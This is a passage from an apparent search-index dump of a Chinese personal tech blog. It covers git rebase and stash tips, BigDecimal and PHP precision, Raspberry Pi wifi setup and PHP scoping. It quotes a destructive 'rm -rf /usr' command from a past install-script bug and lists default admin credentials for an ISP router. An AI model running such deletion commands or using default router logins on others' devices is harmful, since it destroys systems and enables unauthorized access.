blogging } rebase 先加入fork remote的資訊，在做master做git pull --rebase add_remote_name 正常會遇到衝突 就直接解這個問題(git rebase –continue) 正常你的repo應該只有你一個人 之前的commit會改變 可能需要git push -f 但有多人的話git push --force-with-lease 與多人衝突要怎麼辦?? 這時候可能只能用merge方法，但如先前所說會有缺點 Git 更安全的强制推送，–force-with-lease - walterlv 相關資料: Github 發 Pull Request \u0026 貢獻流程速查 Git 更安全的强制推送，–force-with-lease - walterlv 自己提交的 pull request 一直是 open，这个意思说一直在审核期吗？是不是说进入 close 了 就是审核通过了？ - V2EX (https://bitmingw.com/2017/02/16/git-merge-rebase-ours-and-theirs/) Git: 更新分支+解衝突 | Summer。桑莫。夏天 Git: 比較 Merge Squash 與 Rebase Squash | Summer。桑莫。夏天 git pull –rebase vs git rebase : what’s the danger? - Stack Overflow ","date":"2018-12-06","objectID":"/blog/posts/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/:3:0","tags":["git"],"title":"gitea試玩合併分支(PR)","uri":"/blog/posts/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/"},{"categories":["Git"],"content":"git pull –rebase 這個東西非常玄 印象中感覺Github Desktop會做git pull --rebase 所以好像很少會產生merge branch commit git pull --rebase = git fetch + git rebase 發現git rebase , git merge 合併預設remote可以省略 詳細裡面內容 Git: 更新分支+解衝突 | Summer。桑莫。夏天 Git: 比較 Merge Squash 與 Rebase Squash | Summer。桑莫。夏天 備份圖 還有Squash，感覺可以應用比較特別情境上面 先留著筆記 ","date":"2018-12-06","objectID":"/blog/posts/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/:4:0","tags":["git"],"title":"gitea試玩合併分支(PR)","uri":"/blog/posts/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/"},{"categories":["Git"],"content":"PR 其實local端也可以做到 參考gitlab說明 不過有好PR功能不用嗎o.\u003c ","date":"2018-12-06","objectID":"/blog/posts/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/:5:0","tags":["git"],"title":"gitea試玩合併分支(PR)","uri":"/blog/posts/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/"},{"categories":["Git"],"content":"怎麼快速了解git ours和theirs 查看裡面說明，講得很清楚 化解冲突：git merge 与 git rebase 中的 ours 和 theirs | Ming’s Blog 可以看出，«««\u003c 和 »»»\u003e 清晰地标示出了冲突的部分。你需要将它们改成期望的样子。如果你想保留两个版本中的一个而不引入新的修订，就可以使用两个预先定义的代词。«««\u003c 和 ======= 之间的部分称为 ours, ======= 和 »»»\u003e 之间则称为 theirs. 此时，你只需要键入合适的指令即可化解冲突，而不需要进入文本编辑器。在当前项目可以得到如下运行结果 不過…，rebase是相反的 我這邊猜rebase因為是把另外分支為基準 所以自己的code可能算在theirs(自己猜測) ","date":"2018-12-06","objectID":"/blog/posts/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/:6:0","tags":["git"],"title":"gitea試玩合併分支(PR)","uri":"/blog/posts/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/"},{"categories":["Git"],"content":"git rebase小記 從開始commit開始做 舊的commit會從上面依序往下排 git rebase -i --root 沈弘哲 - YouTube git pull vs git pull –rebase - YouTube git rebase interactive - reword - PART 1 - YouTube git rebase interactive - edit - PART 2 - YouTube git rebase interactive - squash fixup - PART 3 - YouTube (20) git rebase interactive - exec drop - PART 4 - YouTube 題外話，剛剛我筆電(elementaryos, git 2.7.x)做git log確沒有顯示HEAD跟remote資訊 查了一下，需要加--decorate 疑似之後2.13的git預設是--decorate git log - How to make git log decorate by default - Stack Overflow ","date":"2018-12-06","objectID":"/blog/posts/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/:7:0","tags":["git"],"title":"gitea試玩合併分支(PR)","uri":"/blog/posts/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/"},{"categories":["JavaScript"],"content":"最近npm的event stream吵得沸沸揚揚的 竟然有人偷偷植入挖幣程式在裡面 只要有import都會中標 這篇指記錄有沒有中標 npm ls event-stream flatmap-stream npm ls -g event-stream flatmap-stream 參考來源:吃瓜群众带你了解 NMP 包 event-stream 被植入比特币后门的来龙去脉-前端开发博客 更多八卦…. 月下载量千万的 npm 包被黑客篡改，Vue 开发者可能正在遭受攻击 - 知乎 ","date":"2018-11-29","objectID":"/blog/posts/nodejs-event-stream%E8%A2%AB%E6%A4%8D%E5%85%A5%E6%AF%94%E7%89%B9%E5%B9%A3%E5%B0%8F%E8%A8%98/:0:0","tags":["javascript","event","stream"],"title":"nodejs event stream被植入比特幣小記","uri":"/blog/posts/nodejs-event-stream%E8%A2%AB%E6%A4%8D%E5%85%A5%E6%AF%94%E7%89%B9%E5%B9%A3%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"最近因為公司最近要改報表公式 因為對BigDicmal不是很熟 所以又特別翻了一下 這邊簡單說明一下，城市運算很大數字會失準 所以必須用別的方法算出正確數字 rs.getBigDecimal(\"num\").multiply(new BigDecimal(Double.valueOf(1.245))).setScale(0, BigDecimal.ROUND_HALF_UP); 瓦特希諾生活記錄: BigDecimal 四捨五入 BigDecimal通过setScale设置小数位数发生ArithmeticException - 小木人印象 setScale(0, BigDecimal.ROUND_HALF_UP); 後面, BigDecimal.ROUND_HALF_UP一定要帶入 否則當四捨五入會跳出Exception You have two BigDecimal numbers both of which require over a 1000 decimal places. Trying to set the scale to only have 113 decimal places means you will lose precision and therefore you need to round. You can use the setScale methods that take a RoundingMode to prevent the exception but not the rounding. java - Rounding necessary with BigDecimal numbers - Stack Overflow System.out.println(“12.5的四舍五入值：” + Math.round(12.5)); java提高篇(三)—–java的四舍五入 - chenssy - 博客园 使用BigDecimal进行精确运算 - chenssy - 博客园 Java Tutorial 第二堂（1）數值與字串型態 by caterpillar | CodeData Java BigDecimal詳解，提供了豐富的四捨五入規則 - 掃文資訊 BigDecimal通过setScale设置小数位数发生ArithmeticException - 小木人印象 BigDecimal.setScale 处理java小数用法 - 天涯海角的博客 - CSDN博客 BigDecimal.setScale()方法 - lilie008的专栏 - CSDN博客 ","date":"2018-11-29","objectID":"/blog/posts/JAVA-BigDicmal-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E7%AD%86%E8%A8%98-%E8%88%87-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E4%B8%80%E4%BA%9B%E4%BA%8B/:0:0","tags":["java","flat","bigdicmal"],"title":"JAVA BigDicmal 精度運算筆記 與  精度運算一些事","uri":"/blog/posts/JAVA-BigDicmal-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E7%AD%86%E8%A8%98-%E8%88%87-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E4%B8%80%E4%BA%9B%E4%BA%8B/"},{"categories":["程式心法"],"content":"PHP 也有浮點數算術問題 例如： 1. $a = 0.1; $b = 0.7; var_dump(($a + $b) == 0.8); 打印出來的值為 boolean false 這是為啥?PHP手冊對於浮點數有以下警告信息: Warning 浮點數精度 顯然簡單的十進制分數如同 0.1 或 0.7 不能在不丟失一點點精度的情況下轉換為內部二進制的格式。這就會造成混亂的結果：例如，floor((0.1+0.7)*10) 通常會返回 7 而不是預期中的 8，因為該結果內部的表示其實是類似 7.9999999999…。 這和一個事實有關，那就是不可能精確的用有限位數表達某些十進制分數。例如，十進制的 1/3 變成了 0.3333333. . .。 所以永遠不要相信浮點數結果精確到了最後一位，也永遠不要比較兩個浮點數是否相等。如果確實需要更高的精度，應該使用任意精度數學函數或者 gmp 函數 黃聰：php精度計算問題 - 掃文資訊 echo .1 + .2; //0.3 var_dump(.1 + .2); //float(0.30000000000000004441) // PHP echo converts 0.30000000000000004441 to a string and shortens it to “0.3”. To achieve the desired floating point result, adjust the precision ini setting: ini_set(“precision”, 17). 0.30000000000000004.com/ These functions are only available if PHP was configured with --enable-bcmath . bcmath ist not installed automatically with php 7 on linux (ubuntu server) You have to use: sudo apt-get install php-bcmath PHP: Installation - Manual ","date":"2018-11-29","objectID":"/blog/posts/JAVA-BigDicmal-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E7%AD%86%E8%A8%98-%E8%88%87-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E4%B8%80%E4%BA%9B%E4%BA%8B/:0:1","tags":["java","flat","bigdicmal"],"title":"JAVA BigDicmal 精度運算筆記 與  精度運算一些事","uri":"/blog/posts/JAVA-BigDicmal-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E7%AD%86%E8%A8%98-%E8%88%87-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E4%B8%80%E4%BA%9B%E4%BA%8B/"},{"categories":["程式心法"],"content":"倍精轉數字小筆記 ","date":"2018-11-29","objectID":"/blog/posts/JAVA-BigDicmal-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E7%AD%86%E8%A8%98-%E8%88%87-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E4%B8%80%E4%BA%9B%E4%BA%8B/:1:0","tags":["java","flat","bigdicmal"],"title":"JAVA BigDicmal 精度運算筆記 與  精度運算一些事","uri":"/blog/posts/JAVA-BigDicmal-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E7%AD%86%E8%A8%98-%E8%88%87-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E4%B8%80%E4%BA%9B%E4%BA%8B/"},{"categories":["程式心法"],"content":"PHP倍精變成數字(字串) number_format(1.2378147769392E+14,0,'','') Convert exponential to a whole number in PHP - Stack Overflow ","date":"2018-11-29","objectID":"/blog/posts/JAVA-BigDicmal-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E7%AD%86%E8%A8%98-%E8%88%87-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E4%B8%80%E4%BA%9B%E4%BA%8B/:1:1","tags":["java","flat","bigdicmal"],"title":"JAVA BigDicmal 精度運算筆記 與  精度運算一些事","uri":"/blog/posts/JAVA-BigDicmal-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E7%AD%86%E8%A8%98-%E8%88%87-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E4%B8%80%E4%BA%9B%E4%BA%8B/"},{"categories":["程式心法"],"content":"PHP 數字字串(with comma)轉乘數字 $number = '1,000'; $number = (int) filter_var($number, FILTER_SANITIZE_NUMBER_INT); var_dump($number); Or $number = '1,000.5669'; $number = (float) str_replace(',', '', $number); var_dump($number); getting int value from comma separated number php - Stack Overflow ","date":"2018-11-29","objectID":"/blog/posts/JAVA-BigDicmal-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E7%AD%86%E8%A8%98-%E8%88%87-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E4%B8%80%E4%BA%9B%E4%BA%8B/:1:2","tags":["java","flat","bigdicmal"],"title":"JAVA BigDicmal 精度運算筆記 與  精度運算一些事","uri":"/blog/posts/JAVA-BigDicmal-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E7%AD%86%E8%A8%98-%E8%88%87-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E4%B8%80%E4%BA%9B%E4%BA%8B/"},{"categories":["程式心法"],"content":"MySQL 倍精變成數字(字串) select REPLACE(FORMAT(100000000000000000000000000000000000000, 0), ',', '') MySQL 轉型型態方法 [資料庫] 如何轉換 Mysql varchar type 到 int type | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY 使用浮點數最最基本的觀念 / 一般討論區 / 程式設計俱樂部 為什麼在項目中要儘量避免使用浮點數，不使用浮點數，那該如何計算浮點數？ - 知乎 CODE-分贓程式的寫法-黑暗執行緒 什麼時候要用浮點數、什麼時候要用倍精? 我目前來看在算錢，尤其算拆分比(有用到乘除)算到有小數點會影響到 盡可能用bigdicmal這種東西 ","date":"2018-11-29","objectID":"/blog/posts/JAVA-BigDicmal-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E7%AD%86%E8%A8%98-%E8%88%87-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E4%B8%80%E4%BA%9B%E4%BA%8B/:1:3","tags":["java","flat","bigdicmal"],"title":"JAVA BigDicmal 精度運算筆記 與  精度運算一些事","uri":"/blog/posts/JAVA-BigDicmal-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E7%AD%86%E8%A8%98-%E8%88%87-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E4%B8%80%E4%BA%9B%E4%BA%8B/"},{"categories":["Git"],"content":"最近專案有新的需求 剛好用git刪除舊分支 遠端分支還是存在 沒刪掉就感覺少了什麼 ","date":"2018-11-26","objectID":"/blog/posts/git%E5%88%AA%E9%99%A4%E9%81%A0%E7%AB%AF-remote-%E5%88%86%E6%94%AF/:0:0","tags":["git"],"title":"git刪除遠端(remote)分支和強制pull下來分支","uri":"/blog/posts/git%E5%88%AA%E9%99%A4%E9%81%A0%E7%AB%AF-remote-%E5%88%86%E6%94%AF/"},{"categories":["Git"],"content":"git刪除遠端(remote)分支 git push origin :cat $ git push origin master:cat 意思就是要把本地的 master 分支推上去之後，在 Server 上建立 cat 分支。如果把這個指令前面的 master 拿掉： $ git push origin :cat 就像是推了空的內容去更新線上的 cat 分支的內容，也算是變相的把該分支刪除。只是使用 Push 指令刪分支，有一點不直覺而已。 參考來源：【狀況題】怎麼刪除遠端的分支？ - 為你自己學 Git | 高見龍 用空分支上傳覆蓋空分支，這個記法真的很方便 ","date":"2018-11-26","objectID":"/blog/posts/git%E5%88%AA%E9%99%A4%E9%81%A0%E7%AB%AF-remote-%E5%88%86%E6%94%AF/:1:0","tags":["git"],"title":"git刪除遠端(remote)分支和強制pull下來分支","uri":"/blog/posts/git%E5%88%AA%E9%99%A4%E9%81%A0%E7%AB%AF-remote-%E5%88%86%E6%94%AF/"},{"categories":["Git"],"content":"強制pull下來分支 I think this is the right way: git fetch --all Then, you have two options: git reset --hard origin/master OR If you are on some other branch: git reset --hard origin/\u003cbranch_name\u003e 參考來源:version control - How do I force “git pull” to overwrite local files? - Stack Overflow git fetch --all 是更新 “所有” remote 底下的分支 但沒想到reset大法可以解決XD 其他重點小記 [译] 使用 -force 被认为是有害的；了解 Git 的 -force-with-lease 命令 - 掘金 ","date":"2018-11-26","objectID":"/blog/posts/git%E5%88%AA%E9%99%A4%E9%81%A0%E7%AB%AF-remote-%E5%88%86%E6%94%AF/:2:0","tags":["git"],"title":"git刪除遠端(remote)分支和強制pull下來分支","uri":"/blog/posts/git%E5%88%AA%E9%99%A4%E9%81%A0%E7%AB%AF-remote-%E5%88%86%E6%94%AF/"},{"categories":["PI"],"content":"最近衝了PI 3，因為沒有多的網路線 目前簡單做個wifi設定筆記 ","date":"2018-11-19","objectID":"/blog/posts/Raspberry-PI-3B%E8%A8%AD%E5%AE%9Awifi%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/:0:0","tags":["pi","wifi"],"title":"Raspberry PI 3B設定wifi連線方法","uri":"/blog/posts/Raspberry-PI-3B%E8%A8%AD%E5%AE%9Awifi%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/"},{"categories":["PI"],"content":"設定ssh 不知道哪個版本就開始要放置sd檔案上面放ssh檔案(touch ssh) 開機才會自動開啟ssh server 當然有上次經驗，我猜想wifi設定應該也有設定的地方 google一下，果然不出我所料 ","date":"2018-11-19","objectID":"/blog/posts/Raspberry-PI-3B%E8%A8%AD%E5%AE%9Awifi%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/:1:0","tags":["pi","wifi"],"title":"Raspberry PI 3B設定wifi連線方法","uri":"/blog/posts/Raspberry-PI-3B%E8%A8%AD%E5%AE%9Awifi%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/"},{"categories":["PI"],"content":"設定wifi boot磁區新增一個wpa_supplicant.conf檔案，內容如下 country=TW ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev update_config=1 network={ ssid=\"SSID_NAME\" psk=\"SSID_KEY\" key_mgmt=WPA-PSK scan_ssid=1 } 原理如下 請注意！！！ 如果是用 Windows 的朋友，千萬不要用「記事本」去編輯，它編出來的純文字檔，在 Linux 讀取會有問題，請改用 Sublime Text、EmiEditor、Notepad++ .... 等支援 Linux 格式的編輯器來編輯。 該輸入的資料全部輸入完畢之後，別忘了存檔，而且要正確的把記憶卡退出電腦，可別直接拔了就走。 接著只要把記憶卡插上 Raspberry Pi 上開機就行了，Rasbian 會把 /boot/wpa_supplicant.conf 複製到 /etc/wpa_supplicant/ 目錄裡，然後就會去讀取裡面的設定值，自動連上無線基地台了。 參考:Raspberry Pi 的基礎 - 沒螢幕、沒鍵盤、沒網路，居然也能設定 Wi-FI 連線 | IT 技術家 邊玩邊學，輕鬆自學 칸: [樹莓派][Raspberry Pi] 樹莓派無頭式安裝教學（一）- wifi + ssh ","date":"2018-11-19","objectID":"/blog/posts/Raspberry-PI-3B%E8%A8%AD%E5%AE%9Awifi%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/:2:0","tags":["pi","wifi"],"title":"Raspberry PI 3B設定wifi連線方法","uri":"/blog/posts/Raspberry-PI-3B%E8%A8%AD%E5%AE%9Awifi%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/"},{"categories":["PI"],"content":"要怎麼知道IP 登入中華電信小烏龜看IP，發現中華電信P883竟然改IP密碼 可能是為了安全性… P883帳號密碼為cht/p883(+mac後面四碼) 怎麼看到mac呢 網路上說可以登入user/user進去看mac 另外一種是arp -a我自己想的 有機會看到 登入p883就能知道IP 最後，只要有開ssh跟wifi後樹莓派接電就能ssh控制使用，真的很方便 留著下次用的時候再翻閱XD ","date":"2018-11-19","objectID":"/blog/posts/Raspberry-PI-3B%E8%A8%AD%E5%AE%9Awifi%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/:3:0","tags":["pi","wifi"],"title":"Raspberry PI 3B設定wifi連線方法","uri":"/blog/posts/Raspberry-PI-3B%E8%A8%AD%E5%AE%9Awifi%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"最近發現PHP function宣告寫在下面 竟然上面可以呼叫… 我以為是JavaScript的hoisting一樣的東西？ 剛好看的我知道你懂 hoisting，可是你了解到多深？ | TechBridge 技術共筆部落格 只有略懂略懂… 但為什麼可以呼叫呢？ 目前還沒找到原因 所以先整理出來 在這邊我先說我的猜測不一定是正確原因 原本想說PHP的function name會不會跟常數是用同一個地方 結果是了一下，發現常數竟然有分大小寫，但感覺不會跟變數衝到…. 好神奇，可能JS寫太久，覺得怪怪的 哈哈 PHP - calling a function before it is declared - Stack Overflow Functions need not be defined before they are referenced, except when a function is conditionally defined as shown in the two examples below. 這邊就說明了function放後面，可以呼叫。還可以透過Conditional functions這東西，這也滿奇怪的 PHP: 用户自定义函数 - Manual 中間有想到是不是常數跟function一樣可以放後面 但答案是不行的 PHP: 超全局变量 - Manual 彻底搞懂PHP的变量作用域和全局变量 - 简书 function test() { global $a; unset($a); } $a = 1; test(); echo $a; 结果 明明是unset了呀，为什么还会打印出来呢？ 众所周知，我们的function里面的永远是个私有变量，unset的确是起作用了，它unset了一个global 的值呀，而global在函数产生一个指向函数外部变量的别名变量，而不是真正的函数外部变量；$GLOBALS[]确确实实调用是外部的变量，函数内外会始终保持一致！ 作者：michaelgbw 链接：https://www.jianshu.com/p/09217582cc08 來源：简书 简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。 老實說…，我還是沒有搞清楚 但這樣看下去，可能還有static要看 PHP: Userland Naming Guide - Manual PHP 5.3/6 新增功能 - Namespace - 石頭閒語 PHP 必須要知道的小細節 · PHP7 開發之道 define() vs const 常數定義 最主要的原因是底層的不同 define() 是 run-time constants 而 const 是 compile-time constants. define() 是 global scope 或者在某個 namespace，所以不能用來定義 class-scope 的常數。 define()可以用在 if() 但 const不能用在 if() 看到這邊還真的不知道這兩個不太一樣orz PHP严重致命错误处理:php Fatal error: Cannot redeclare clas - 小星星程序员的个人空间 - 开源中国 function,class重複宣告會有問題 PHP中的提升(Hoisting) | 程式前沿 這篇有簡易測試Hoisting，不過我認為跟js的hoisting不一樣 還有測試code $poor_function = function(){ }; var_dump(function_exists('poor_function')); 這樣是沒有意義的 可以參考下面裡面 Use Variable as Function Name in PHP - Stack Overflow 不過我有測試var_dump($poor_function)顯示是一個閉包 PHP中定义常量的区别，define() vs. const - 简书 這邊有紀錄很多define()跟const差異 其他要紀錄的 PHP 底层的运行机制与原理 - 文章 - 伯乐在线 CGI、FastCGI和PHP-FPM关系图解 - 歪麦博客 PHP function to generate v4 UUID - Stack Overflow 結論，我還是不懂PHP QQ ","date":"2018-11-15","objectID":"/blog/posts/%E6%89%8B%E9%82%8APHP%E4%B8%80%E4%BA%9Bnote/:0:0","tags":["php"],"title":"手邊PHP一些note...","uri":"/blog/posts/%E6%89%8B%E9%82%8APHP%E4%B8%80%E4%BA%9Bnote/"},{"categories":["程式心法"],"content":"回想當初，對/usr資料夾不太熟悉 有發現有些/usr/bin跟/bin 但不知道兩者差異 今天讀了bug 永存 備份圖 裡面考古了一堆東西 有解除我心中的疑惑 window不能用aux,com命名，就算有副檔名也不行 程序員大型考古活動。明白了原來CON, PRN, AUX, NUL, COM1~9, LPT1~9。這些文件名windows都不能命名 突然想到之前MySQL在window也不能設定table大小寫 看來應該是系統的缺陷 為什麼 Linux 會有 /usr 這個文件夾? 如果有新手問你為什麼，你要很裝逼的告訴他：/usr 下面放的都是不會影響系統正常運行的，而根目錄下面的都是最重要的。當你做緊急維護的時候，可以沒有 /usr，但不能沒有根目錄。 神說：要有區別。所以第一個盤就用來放根目錄，作為開發系統用，而第二個硬盤就用來放用戶的東西，然後掛載到 /usr下面。用戶目錄下面就放的都是小東西，所以那可是 2.5 MB 近乎無限的空間啊(大霧) 神說：我x！第一塊盤滿了！作為一個積極開發的系統， 肯定會生成大量的二進制文件，而各種 debug 的工具更是龐大無比。再買一塊 RK05 是可以的，就是沒錢而已。而似乎用戶目錄 /usr 不是很滿…… 神說：複製黏貼是神聖的。所以他們就把整個系統文件架構都複製了一份，黏貼到 /usr 下面， 所以就有了 /usr/bin, /usr/lib。但是哪些文件要移過來呢？肯定是那些不會影響系統啟動的啊，因為首先要啟動系統，然後再把 /usr 掛載到根目錄下面。 神說：就這麼定了。於是直到 Ubuntu(一個流行的Linux)的最新版本 18.10，你系統裡面會有 /bin 和 /usr/bin，就是因為 45 年前兩個極客買不起 2.5 MB 硬盤做出的決定。 這個太有趣啦XDD 下面 撒旦的報復 神說： /usr 不重要。撒旦說：呵！ 隨著 Linux 的發展，大部分的軟件都放在 /usr 下面了。當然，都是一些不會影響系統啟動的程序；但是對於用戶來說，/usr的程序更好玩，更重要，例如 firefox (瀏覽器），utorrent（下載器），mpv （播放器）， firefox（賢者模式煎蛋器）…… 2014 年 bumblebee 作為一個 Linux 支持 Nvidia 顯卡的一個牛逼模式的軟件，向世人展示了什麼就「不重要」。在他們的安裝腳本中，不小心多寫一個空格，從 「 rm -rf /usr/lib/nvidia-current/xorg/xorg 「 變成了 「 rm -rf /usr /lib/nvidia-current/xorg/xorg 「 是不是你也沒看出來是什麼問題？就是在/usr 後多了一個空格，所以從刪除 /usr/lib/nvidia-current/xorg/xorg 變成了 刪除 /usr 和/lib/nvidia-current/xorg/xorg 兩個文件夾。 整個/usr被刪除了，哀鴻遍野…… rm 作為 Linux 的殺器，是無法恢復的。煎蛋器就這麼不見了…… 這個也很有趣，但我相信發生在自己身上一定是悲劇orz ","date":"2018-11-14","objectID":"/blog/posts/bug%E6%B0%B8%E5%AD%98%E9%87%8D%E9%BB%9E%E5%B0%8F%E8%A8%98-%E7%82%BA%E4%BB%80%E9%BA%BC-usr%E6%9C%83%E6%9C%89bin%E8%B3%87%E6%96%99%E5%A4%BE/:0:0","tags":["window"],"title":"bug永存重點小記 - 為什麼/usr會有bin資料夾","uri":"/blog/posts/bug%E6%B0%B8%E5%AD%98%E9%87%8D%E9%BB%9E%E5%B0%8F%E8%A8%98-%E7%82%BA%E4%BB%80%E9%BA%BC-usr%E6%9C%83%E6%9C%89bin%E8%B3%87%E6%96%99%E5%A4%BE/"},{"categories":["Git"],"content":"最近使用Socuretree，發現大部分功能都看懂了 Chocolatey Gallery | Sourcetree for Windows Enterprise 3.0.8 但是我發現stash，可以看到裡面存甚麼東西 Sourcetree還有git add 指定行數到index 這個看起來很方便 不知道原生怎麼處理 這邊筆記 ","date":"2018-11-14","objectID":"/blog/posts/git-commit-%E6%8C%87%E5%AE%9A%E5%B9%BE%E8%A1%8C-git-stash-%E6%9F%A5%E7%9C%8B%E5%B7%AE%E7%95%B0%E5%85%A7%E5%AE%B9/:0:0","tags":["git","git stash"],"title":"git commit 指定幾行 \u0026 git stash 查看差異內容","uri":"/blog/posts/git-commit-%E6%8C%87%E5%AE%9A%E5%B9%BE%E8%A1%8C-git-stash-%E6%9F%A5%E7%9C%8B%E5%B7%AE%E7%95%B0%E5%85%A7%E5%AE%B9/"},{"categories":["Git"],"content":"git add -p # To remove '-' lines, make them ' ' lines (context). # To remove '+' lines, delete them. # Lines starting with # will be removed 簡單來說 ‘+‘不想被add進去，要移除單行內容(如:vi dd) ‘-‘不想被add進去，要取代’ ‘(空白)(如:vi r 空白) ","date":"2018-11-14","objectID":"/blog/posts/git-commit-%E6%8C%87%E5%AE%9A%E5%B9%BE%E8%A1%8C-git-stash-%E6%9F%A5%E7%9C%8B%E5%B7%AE%E7%95%B0%E5%85%A7%E5%AE%B9/:1:0","tags":["git","git stash"],"title":"git commit 指定幾行 \u0026 git stash 查看差異內容","uri":"/blog/posts/git-commit-%E6%8C%87%E5%AE%9A%E5%B9%BE%E8%A1%8C-git-stash-%E6%9F%A5%E7%9C%8B%E5%B7%AE%E7%95%B0%E5%85%A7%E5%AE%B9/"},{"categories":["Git"],"content":"git stash show -p Git diff against a stash - Stack Overflow 這樣就能看到差異了 其實Sourcetree也真的算滿方便的東西 雖然之前用小烏龜，看log都很方便用了 ","date":"2018-11-14","objectID":"/blog/posts/git-commit-%E6%8C%87%E5%AE%9A%E5%B9%BE%E8%A1%8C-git-stash-%E6%9F%A5%E7%9C%8B%E5%B7%AE%E7%95%B0%E5%85%A7%E5%AE%B9/:2:0","tags":["git","git stash"],"title":"git commit 指定幾行 \u0026 git stash 查看差異內容","uri":"/blog/posts/git-commit-%E6%8C%87%E5%AE%9A%E5%B9%BE%E8%A1%8C-git-stash-%E6%9F%A5%E7%9C%8B%E5%B7%AE%E7%95%B0%E5%85%A7%E5%AE%B9/"},{"categories":["Git"],"content":"番外vim筆記(單行上移/下移)方法 :m+ = 把目前這一行往下移動一行 :m-2 = 把目前這一行往上移動一行 Vim的操作小技巧 | 高見龍 或者 ddkP 刪除單行 + 貼上 请问vim如何移动当前行向上或向下？不用选中 - V2EX 多行我就沒有測試了 [实践OK]vi行移动：vim上下移动一行或一段代码，及回到最近修改位置的vim快捷键，回到倒数第二次修改的位置，vim一下知道所在行的函数名设置方法。在文件中快速查找光标处一样的单词。 - 向东博客 专注WEB应用 构架之美 — 构架之美，在于尽态极妍 | 应用之美，在于药到病除 - 赢在IT，Playin’ with IT,Focus on Killer Application,Marketing Meets Technology. 在Vim，整行上下移动_vim_帮酷编程问答 最近為了git rebase，發現vim不會上移一行…. 特別找了一下 Vim | 高見龍 爽爽快快學Vim(3) - Vim Plugins | 高見龍 ","date":"2018-11-14","objectID":"/blog/posts/git-commit-%E6%8C%87%E5%AE%9A%E5%B9%BE%E8%A1%8C-git-stash-%E6%9F%A5%E7%9C%8B%E5%B7%AE%E7%95%B0%E5%85%A7%E5%AE%B9/:3:0","tags":["git","git stash"],"title":"git commit 指定幾行 \u0026 git stash 查看差異內容","uri":"/blog/posts/git-commit-%E6%8C%87%E5%AE%9A%E5%B9%BE%E8%A1%8C-git-stash-%E6%9F%A5%E7%9C%8B%E5%B7%AE%E7%95%B0%E5%85%A7%E5%AE%B9/"},{"categories":["Git"],"content":"stash apply 要把 Stash 撿回來用，除了 pop 之外，另一個指令是 apply： $ git stash apply stash@{0} 這是指會把 stash@{0} 這個 Stash 拿來套用在現在的分支上，但 Stash 不會刪除，還是會留在 Stash 列表上。所以你可把 pop 指令看成「apply Stash + drop Stash」。 參考:【狀況題】手邊的工作做到一半，臨時要切換到別的任務 - 為你自己學 Git | 高見龍 ","date":"2018-11-14","objectID":"/blog/posts/git-commit-%E6%8C%87%E5%AE%9A%E5%B9%BE%E8%A1%8C-git-stash-%E6%9F%A5%E7%9C%8B%E5%B7%AE%E7%95%B0%E5%85%A7%E5%AE%B9/:4:0","tags":["git","git stash"],"title":"git commit 指定幾行 \u0026 git stash 查看差異內容","uri":"/blog/posts/git-commit-%E6%8C%87%E5%AE%9A%E5%B9%BE%E8%A1%8C-git-stash-%E6%9F%A5%E7%9C%8B%E5%B7%AE%E7%95%B0%E5%85%A7%E5%AE%B9/"},{"categories":["Git"],"content":"重新上 remote 新的分支 最近分支命名錯誤，重新修改本地端分支名字 git branch -m [ branc_name ] 發現 git push 